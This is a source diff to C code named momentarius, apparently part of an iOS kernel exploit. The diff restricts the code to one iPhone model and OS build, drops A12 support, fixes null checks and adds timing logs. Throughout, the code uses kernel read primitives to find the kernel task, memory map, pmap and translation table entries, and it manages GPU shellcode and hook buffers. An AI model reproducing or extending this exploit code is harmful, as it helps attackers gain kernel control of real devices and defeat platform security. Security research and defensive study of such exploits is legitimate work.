@@ -1,5 +1,7 @@
 #include "utils.h"
 #include "momentarius.h"
+#include <string.h>
+#include <time.h>
 
 momentarius_t momentarius = {0};
 volatile bool stop_write = false;
@@ -27,26 +29,47 @@ static void momentarius_deinit(void) {
     if (momentarius.gfx.shc_data != NULL) free(momentarius.gfx.shc_data);
     if (momentarius.gfx.ttbr1_load_data != NULL) free(momentarius.gfx.ttbr1_load_data);
     if (momentarius.gfx.hook_data != NULL) free(momentarius.gfx.hook_data);
+
+    for (uint32_t i = 0; i < momentarius.allocator_fd_count; i++) {
+        if (momentarius.allocator_fds[i][0] >= 0) close(momentarius.allocator_fds[i][0]);
+        if (momentarius.allocator_fds[i][1] >= 0) close(momentarius.allocator_fds[i][1]);
+    }
     
     bzero(&momentarius, sizeof(momentarius_t));
     stop_write = false;
 }
 
+static bool momentarius_supported_profile(void) {
+    char build[64] = {0};
+    char machine[64] = {0};
+    size_t build_size = sizeof(build);
+    size_t machine_size = sizeof(machine);
+
+    return sysctlbyname("kern.osversion", build, &build_size, NULL, 0) == 0 &&
+           sysctlbyname("hw.machine", machine, &machine_size, NULL, 0) == 0 &&
+           strcmp(build, "20G75") == 0 && strcmp(machine, "iPhone12,1") == 0;
+}
+
 static int momentarius_init(void) {
+    // Only this A13 device/build pair has the static analysis documented in
+    // INTEGRATION_STATUS.md. In particular, never fall through to the A12
+    // implementation or treat a major-version/chip-family match as enough.
+    if (!momentarius_supported_profile()) goto err;
+
     momentarius.self_proc_addr = proc_self();
     if (momentarius.self_proc_addr == 0) goto err;
     
     uint64_t kern_proc_addr = proc_find(0);
     if (kern_proc_addr == 0) goto err;
     uint64_t kern_task_addr = proc_task(kern_proc_addr);
-    if (kern_proc_addr == 0) goto err;
+    if (kern_task_addr == 0) goto err;
     
     momentarius.kern_vm_map = kread_ptr(kern_task_addr + koffsetof(task, map));
     if (momentarius.kern_vm_map == 0) goto err;
     uint64_t kern_pmap = kread_ptr(momentarius.kern_vm_map + 0x40);
-    if (momentarius.kern_vm_map == 0) goto err;
+    if (kern_pmap == 0) goto err;
     
-    momentarius.kern_tte = kread64(kern_pmap + 0x0);
+    momentarius.kern_tte = kread_ptr(kern_pmap + 0x0);
     momentarius.kern_ttep = kread64(kern_pmap + 0x8);
     if (momentarius.kern_tte == 0 || momentarius.kern_ttep == 0) goto err;
 
@@ -72,14 +95,20 @@ static int momentarius_init(void) {
     int err = -1;
     
     switch(cpu_family) {
-        case CPUFAMILY_ARM_VORTEX_TEMPEST: /* A12(X/Z) */ {
-            momentarius.gfx.text_va = 0;
-            err = momentarius_init_A12();
-        } break;
-            
-        case CPUFAMILY_ARM_LIGHTNING_THUNDER: /* A13 */ {
+        case CPUFAMILY_ARM_LIGHTNING_THUNDER: /* A13; exact profile checked above */ {
             momentarius.gfx.text_va = 0xFFFFFF8000000000;
+            struct timespec init_start = {0};
+            struct timespec init_end = {0};
+            bool timed = clock_gettime(CLOCK_MONOTONIC, &init_start) == 0;
             err = momentarius_init_A13();
+            if (err == 0 && timed && clock_gettime(CLOCK_MONOTONIC, &init_end) == 0) {
+                uint64_t start_ns = (uint64_t)init_start.tv_sec * 1000000000ULL +
+                                    (uint64_t)init_start.tv_nsec;
+                uint64_t end_ns = (uint64_t)init_end.tv_sec * 1000000000ULL +
+                                  (uint64_t)init_end.tv_nsec;
+                debug_log("A13 init duration: %llu ms\n",
+                          (unsigned long long)((end_ns - start_ns) / 1000000ULL));
+            }
         } break;
         default: break;
     }
